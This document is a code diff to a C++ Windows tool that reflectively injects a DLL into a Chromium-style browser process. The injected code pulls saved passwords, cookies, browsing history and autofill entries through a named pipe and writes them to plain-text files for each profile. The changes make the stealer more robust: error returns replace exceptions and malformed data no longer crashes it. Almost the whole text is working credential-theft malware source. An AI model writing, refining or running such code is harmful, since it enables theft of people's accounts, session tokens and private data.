@@ -68,12 +68,18 @@ void kill_processes_by_name(const std::wstring& exe_name) {
     CloseHandle(snapshot);
 }
 
-void inject_dll_reflective(HANDLE h_process, const std::vector<unsigned char>& dll_bytes) {
+bool inject_dll_reflective(HANDLE h_process, const std::vector<unsigned char>& dll_bytes) {
     auto* dos_header = (PIMAGE_DOS_HEADER)dll_bytes.data();
-    if (dos_header->e_magic != IMAGE_DOS_SIGNATURE) throw std::runtime_error("Invalid DOS signature");
+    if (dos_header->e_magic != IMAGE_DOS_SIGNATURE) {
+        std::cerr << "Invalid DOS signature" << std::endl;
+        return false;
+    }
 
     auto* nt_headers = (PIMAGE_NT_HEADERS64)(dll_bytes.data() + dos_header->e_lfanew);
-    if (nt_headers->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) throw std::runtime_error("Not a 64-bit DLL");
+    if (nt_headers->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
+        std::cerr << "Not a 64-bit DLL" << std::endl;
+        return false;
+    }
 
     size_t image_size = nt_headers->OptionalHeader.SizeOfImage;
     void* preferred_base = (void*)nt_headers->OptionalHeader.ImageBase;
@@ -89,7 +95,10 @@ void inject_dll_reflective(HANDLE h_process, const std::vector<unsigned char>& d
         remote_base = VirtualAllocEx(h_process, nullptr, image_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     }
 
-    if (!remote_base) throw std::runtime_error("Failed to allocate memory in target process");
+    if (!remote_base) {
+        std::cerr << "Failed to allocate memory in target process" << std::endl;
+        return false;
+    }
 
     WriteProcessMemory(h_process, remote_base, dll_bytes.data(), nt_headers->OptionalHeader.SizeOfHeaders, nullptr);
 
@@ -109,8 +118,6 @@ void inject_dll_reflective(HANDLE h_process, const std::vector<unsigned char>& d
         relocation_required
     };
 
-    // Need to find realign_pe address. In a real scenario, this would be part of the injector.
-    // For this port, we assume realign_pe is compiled into the injector and we'll copy it.
     size_t bootstrapper_size = (size_t)realign_pe_end - (size_t)realign_pe;
     if (bootstrapper_size == 0) bootstrapper_size = 4096;
 
@@ -125,7 +132,9 @@ void inject_dll_reflective(HANDLE h_process, const std::vector<unsigned char>& d
     if (h_thread) {
         WaitForSingleObject(h_thread, INFINITE);
         CloseHandle(h_thread);
+        return true;
     }
+    return false;
 }
 
 void inject_and_collect(const std::vector<unsigned char>& dll_bytes, const BrowserConfig& config) {
@@ -149,8 +158,7 @@ void inject_and_collect(const std::vector<unsigned char>& dll_bytes, const Brows
         return;
     }
 
-    try {
-        inject_dll_reflective(pi.hProcess, dll_bytes);
+    if (inject_dll_reflective(pi.hProcess, dll_bytes)) {
         ResumeThread(pi.hThread);
 
         HANDLE pipe = CreateNamedPipeW(L"\\\\.\\pipe\\chrome_extractor", PIPE_ACCESS_INBOUND, PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT, 1, 65536, 65536, 0, nullptr);
@@ -169,34 +177,36 @@ void inject_and_collect(const std::vector<unsigned char>& dll_bytes, const Brows
                 } while (!read_success && GetLastError() == ERROR_MORE_DATA);
 
                 if (!buffer.empty()) {
-                    auto profiles = json::parse(buffer);
-                    fs::create_directories(config.name);
-                    for (size_t i = 0; i < profiles.size(); i++) {
-                        std::string folder_name = "profile " + std::to_string(i + 1);
-                        fs::path profile_dir = fs::path(config.name) / folder_name;
-                        fs::create_directories(profile_dir);
+                    auto profiles = json::parse(buffer, nullptr, false);
+                    if (!profiles.is_discarded()) {
+                        fs::create_directories(config.name);
+                        for (size_t i = 0; i < profiles.size(); i++) {
+                            std::string folder_name = "profile " + std::to_string(i + 1);
+                            fs::path profile_dir = fs::path(config.name) / folder_name;
+                            fs::create_directories(profile_dir);
 
-                        auto& p = profiles[i];
-                        std::ofstream pass_f(profile_dir / "password.txt");
-                        for (auto& entry : p["passwords"]) pass_f << "URL: " << entry["url"] << "\nUser: " << entry["username"] << "\nPass: " << entry["password"] << "\n\n";
+                            auto& p = profiles[i];
+                            std::ofstream pass_f(profile_dir / "password.txt");
+                            for (auto& entry : p["passwords"]) pass_f << "URL: " << entry["url"] << "\nUser: " << entry["username"] << "\nPass: " << entry["password"] << "\n\n";
 
-                        std::ofstream cook_f(profile_dir / "cookie.txt");
-                        for (auto& entry : p["cookies"]) cook_f << "Host: " << entry["host"] << " | Name: " << entry["name"] << " | Value: " << entry["value"] << "\n";
+                            std::ofstream cook_f(profile_dir / "cookie.txt");
+                            for (auto& entry : p["cookies"]) cook_f << "Host: " << entry["host"] << " | Name: " << entry["name"] << " | Value: " << entry["value"] << "\n";
 
-                        std::ofstream hist_f(profile_dir / "history.txt");
-                        for (auto& entry : p["history"]) hist_f << "URL: " << entry["url"] << " | Title: " << entry["title"] << " | Visits: " << entry["visit_count"] << "\n";
+                            std::ofstream hist_f(profile_dir / "history.txt");
+                            for (auto& entry : p["history"]) hist_f << "URL: " << entry["url"] << " | Title: " << entry["title"] << " | Visits: " << entry["visit_count"] << "\n";
 
-                        std::ofstream auto_f(profile_dir / "autofill.txt");
-                        for (auto& entry : p["autofill"]) auto_f << "Name: " << entry["name"] << " | Value: " << entry["value"] << "\n";
+                            std::ofstream auto_f(profile_dir / "autofill.txt");
+                            for (auto& entry : p["autofill"]) auto_f << "Name: " << entry["name"] << " | Value: " << entry["value"] << "\n";
 
-                        std::cout << "Saved " << config.name << " profile: " << p["name"] << std::endl;
+                            std::cout << "Saved " << config.name << " profile: " << p["name"] << std::endl;
+                        }
                     }
                 }
             }
             CloseHandle(pipe);
         }
-    } catch (const std::exception& e) {
-        std::cerr << "Error during injection: " << e.what() << std::endl;
+    } else {
+        std::cerr << "Error during injection" << std::endl;
     }
 
     TerminateProcess(pi.hProcess, 0);
